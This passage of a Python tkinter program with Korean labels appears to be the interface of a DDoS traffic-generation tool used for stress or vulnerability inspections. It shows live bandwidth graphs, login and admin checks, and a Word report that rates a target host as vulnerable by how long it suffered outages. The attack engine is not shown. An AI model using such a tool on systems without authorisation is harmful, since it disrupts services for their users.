        self._report_btn.config(state=tk.DISABLED, text="⏳ 생성 중…")
        import tempfile

        tmpdir = tempfile.mkdtemp()
        img1   = os.path.join(tmpdir, "bw.png")
        img2   = os.path.join(tmpdir, "http.png")

        try:
            self._capture_subplot(self._ax,  img1)
            self._capture_subplot(self._ax2, img2)
        except Exception as e:
            messagebox.showerror("캡처 오류", str(e))
            self._report_btn.config(state=tk.NORMAL, text="📄 보고서 생성")

        meta = {
            "host":   getattr(self, "_report_host",  "—"),
            "port":   getattr(self, "_report_port",  "—"),
            "atk":    getattr(self, "_report_atk",   "—"),
            "bw":     getattr(self, "_report_bw",    100),
            "start":  getattr(self, "_report_start", None),
            "end":    getattr(self, "_report_end",   None),
            "http_t": list(self._http_t),
            "http_v": list(self._http_v),
        }

        def _worker():
            import shutil
            try:
                desktop = os.path.join(os.path.expanduser("~"), "Desktop")
                out = os.path.join(desktop, "DDoS 트래픽 발생 보고서.docx")
                _write_docx_report(img1, img2, out, meta)
                self.after(0, lambda p=out: messagebox.showinfo(
                    "보고서 완료", f"저장 위치:\n{p}"))
            except ImportError:
                self.after(0, lambda: messagebox.showerror(
                    "보고서 오류",
                    "python-docx 패키지가 없습니다.\n\n"
                    "설치 명령:\n  pip install python-docx"))
            except Exception as e:
                msg = str(e)
                self.after(0, lambda: messagebox.showerror("보고서 오류", msg))
            finally:
                shutil.rmtree(tmpdir, ignore_errors=True)
                self.after(0, lambda: self._report_btn.config(
                    state=tk.NORMAL, text="📄 보고서 생성"))

        threading.Thread(target=_worker, daemon=True).start()

    # ─── Periodic tick ────────────────────────────────────────────

    def _tick(self):
        if self.ctrl.running:
            bw  = self.stats.bw_mbps
            now = time.time()
            self._bw_t.append(now)
            self._bw_v.append(min(bw, 100.0))

            self._lbl_bw.config(  text=f"{bw:.2f} MB/s{'  ⏸' if self.ctrl.paused else ''}")
            self._lbl_rps.config( text=f"{self.stats.rps:.0f}")
            self._lbl_ok.config(  text=f"{self.stats.success:,}")
            self._lbl_fail.config(text=f"{self.stats.failed:,}")

            self._update_graph(now)
            self._update_http_graph(now)

        self.after(TICK_MS, self._tick)

    def _update_graph(self, now: float):
        if len(self._bw_t) >= 2:
            times  = list(self._bw_t)
            values = list(self._bw_v)
            self._line.set_data(times, values)
            self._ax.set_xlim(now - GRAPH_WINDOW, now)
            for coll in self._ax.collections[:]:
                coll.remove()
            self._ax.fill_between(times, 0, values, alpha=0.18, color="#38bdf8")
        self._canvas.draw_idle()

    def _update_http_graph(self, now: float):
        if not self._http_t:
            return
        times  = list(self._http_t)
        values = list(self._http_v)
        self._http_line.set_data(times, values)
        self._ax2.set_xlim(now - GRAPH_WINDOW, now)
        self._canvas.draw_idle()


# ══════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════

def _is_admin() -> bool:
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _write_docx_report(img1: str, img2: str, out_path: str, meta: dict = None):
    """두 PNG 이미지를 포함한 Word(.docx) 보고서 생성."""
    from docx import Document
    from docx.shared import Mm, Pt
    from docx.enum.text import WD_ALIGN_PARAGRAPH

    meta = meta or {}
    start: "datetime | None" = meta.get("start")
    end:   "datetime | None" = meta.get("end")

    start_str = start.strftime("%Y-%m-%d %H:%M") if start else "—"
    if end:
        end_str = end.strftime("%H:%M")
    elif start:
        end_str = "점검 중"
    else:
        end_str = "—"
    date_line = f"{start_str} - {end_str}" if (start and end) else start_str

    host  = meta.get("host", "—")
    port  = meta.get("port", "—")
    atk   = meta.get("atk",  "—")
    bw    = int(meta.get("bw", 100))

    # ── 단절/지연 시간 계산 ──────────────────────────────────────────
    http_t: list = meta.get("http_t", [])
    http_v: list = meta.get("http_v", [])
    issue_secs = 0
    for i, v in enumerate(http_v):
        if v in (0, 1):   # 단절(0) 또는 지연(1)
            if i + 1 < len(http_t):
                issue_secs += http_t[i + 1] - http_t[i]
            else:
                issue_secs += 1.0
    issue_secs = round(issue_secs)

    # ── 점검 결과 판정 ───────────────────────────────────────────────
    if issue_secs >= 5:
        result_body = (
            f"점검 {host}:{port} 으로 {atk} 공격 트래픽 {bw}MB/s 발생 결과 "
            f"단절 및 지연이 {issue_secs}초가 발생하여 "
            "해당 트래픽에 대해 취약한 것으로 판단됨"
        )
    else:
        result_body = (
            f"점검 {host}:{port} 으로 {atk} 공격 트래픽 {bw}MB/s 발생 결과 "
            f"단절 및 지연이 {issue_secs}초 이하가 발생하여 "
            "해당 트래픽에 대해 정상적으로 대응이 된 것으로 판단됨"
        )

    doc = Document()

    title = doc.add_heading("DDoS 트래픽 보고서", level=0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER

    doc.add_paragraph()

    def _info(label: str, value: str):
        p = doc.add_paragraph()
        run_lbl = p.add_run(label)
        run_lbl.bold = True
        run_lbl.font.size = Pt(11)
        run_val = p.add_run(value)
        run_val.font.size = Pt(11)
        return p

    _info("1. 점검 일시 : ", date_line)
    _info("2. 점검 대상 : ", f"{host}  :  {port}")
    _info("3. 공격 종류 : ", atk)
    _info("4. 캡처 화면", "")

    doc.add_paragraph("[ 대역폭 그래프 ]")
    doc.add_picture(img1, width=Mm(160))
    doc.add_paragraph()
    doc.add_paragraph("[ 대상 모니터링 ]")
    doc.add_picture(img2, width=Mm(160))

    doc.add_paragraph()
    _info("5. 점검결과 : ", result_body)

    doc.save(out_path)


# ══════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    login = LoginWindow()
    login.mainloop()
    if login.logged_in_user:
        App(login.logged_in_user).mainloop()
